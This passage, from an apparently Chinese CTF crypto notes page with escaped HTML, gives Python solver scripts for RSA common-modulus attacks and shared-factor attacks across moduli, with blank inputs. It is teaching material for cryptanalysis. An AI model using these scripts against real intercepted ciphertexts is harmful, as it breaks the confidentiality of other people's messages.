punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  main&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;共模攻击分解e1e2并爆破判别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#共模攻击分解e1e2并爆破判别&#34;&gt;#&lt;/a&gt; 共模攻击（分解 e1e2 并爆破判别）&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e1e2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; libnum&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;rsa_gong_N_def&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;e2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;c1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;c2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#共模攻击函数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    e1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;e1,e2:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;e1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;e2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;gcdext&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;mpz:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    s1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; s&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    s2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; s&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; s1 &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        s1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; s1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        c1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; s2 &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        s2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; s2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        c2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    m &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;s1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c2 &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;s2 &lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; n&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;de&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#因为此时的 m 不是真正的 m，而是 m^k，所以对 m^k 进行爆破&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    k &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; k&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#指定 k 小于 1000&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        mk &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; c &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; n&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;k&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        flag&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; true1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;iroot&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mk&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#返回的第一个数值为开方数，第二个数值为布尔型，可整除为 true，可自行测试&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; true1&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token comment&#34;&gt;# print(libnum.n2s(int(flag)))&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        k &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; e1 &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;e1e2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; e1e2&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;e1&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;         &lt;span class=&#34;token comment&#34;&gt;#爆破可整除的 e&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        e2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e1e2&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;e1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        c&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;rsa_gong_N_def&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;gcd&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;e2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        m1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;de&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; m1&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#指定输出 m1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libnum&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;n2s&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;em相同存在两个n有公约数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#em相同存在两个n有公约数&#34;&gt;#&lt;/a&gt; e,m 相同，存在两个 n 有公约数&lt;/h1&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; gmpy2 &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; invert&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; iroot&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; gmpy2 &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; gp&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; libnum &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; xgcd&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; invmod&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&gt;&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            pub_p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;gcdext&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pub_p&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;j&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; i&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; j&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; pub_p&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                a&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;p&lt;span class=&#34;token 